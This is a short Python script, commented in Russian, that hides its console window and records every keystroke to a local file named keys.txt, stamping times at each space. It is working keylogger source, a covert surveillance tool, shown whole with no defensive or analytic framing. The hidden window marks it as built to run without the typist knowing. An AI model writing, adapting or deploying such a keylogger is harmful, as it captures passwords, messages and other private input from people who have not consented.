from pynput.keyboard import Key, Listener
import win32api
import win32gui
import win32console
 
from datetime import datetime
 
 
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
 
def key_pressed(key):
    # убираем кавычки в выводе
    k = str(key).replace("'", '')
 
    # заменяем непонятный вывод пробела на символ переноса строки
    if key == Key.space:
        k = ''.join(('\n', datetime.utcnow().strftime('%d %m %Y %H:%M'), '\n'))
 
    # мы не хотим видеть в файле всякие непонятные клавиши типа контрола, бекспейсов и т.д.
    if k.find('Key.') == -1:
        with open('keys.txt', 'at') as f:
            f.write(k)
 
 
def key_released(key):
    if key == Key.esc:
        return False
 
 
with Listener( 
    on_press=key_pressed,
    on_release=key_released,
) as listener:
    listener.join()
